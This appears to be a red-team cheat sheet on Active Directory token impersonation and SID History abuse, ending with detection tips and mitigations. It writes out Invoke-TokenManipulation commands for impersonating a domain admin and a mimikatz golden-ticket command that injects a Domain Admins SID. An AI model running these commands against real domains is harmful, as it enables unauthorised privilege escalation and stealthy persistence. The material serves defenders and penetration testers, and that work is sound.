# 🛡️ Token Impersonation + SID History Abuse

**Token Impersonation** and **SID History Abuse** are advanced post-exploitation techniques used by attackers and red teamers to **elevate privileges**, **move laterally**, and **persist inside Active Directory** without adding users or leaving obvious traces.

> ⚠️ These are domain-level techniques used by real APTs to live off the land. Often invisible to standard logging unless you're looking at the right places.

---

## 🛠️ What They Do
- **Token Impersonation**: Steals access tokens from high-privileged processes and impersonates them to access resources
- **SID History Abuse**: Adds legacy SIDs (including high-privilege ones) to low-privileged users to inherit permissions silently
- Both can bypass group membership and role checks

---

## 💣 Token Impersonation Example
### 1. Steal a Token (e.g., from a SYSTEM or admin process)
```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\adminuser"
```
✅ Temporarily assumes identity of a privileged user — no password needed

### 2. Spawn Shell as That User
```powershell
Invoke-TokenManipulation -CreateProcess "cmd.exe"
```
✅ New shell runs with impersonated user's privileges

---

## 💣 SID History Abuse (Persistence/Lateral Move)
### 1. Add a High-Priv SID to a Low Priv User
Use `mimikatz` or direct LDAP edit:
```mimikatz
lsadump::sid /user:DOMAIN\targetuser
kerberos::golden /sid:DOMAIN-SID /sids:DA-SID /user:targetuser /domain:corp.local /rc4:NTLM_HASH /ptt
```
✅ The low-priv user now inherits rights from `Domain Admins` (or other high-priv groups)

---

### 2. Use SIDHistory to Access Systems
✅ Even though the user isn’t in the privileged group, access is granted due to SID history
✅ Often used during DCShadow or DCsync attacks for stealth escalation

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Tokens spawned from processes not matching session | Detect process privilege mismatches (EDR/sysmon) |
| Use of `lsass` or `mimikatz` to extract tokens | Monitor memory access and lsass.exe interaction |
| Accounts with `SIDHistory` field populated | Audit AD users for inherited SID entries (PowerShell/LDAP)

---

## 🔐 Mitigation Strategies
- Disable or strictly monitor use of SIDHistory in AD
- Implement LSASS protections (like Credential Guard)
- Log and alert on privilege escalation events (e.g., logon with elevated group rights without membership)
- Limit SeImpersonatePrivilege to only necessary services

---

> 🧠 These aren’t tricks — they’re real tools used in stealth escalation chains by APTs, ransomware crews, and stealthy insiders. If they get in, this is how they live.
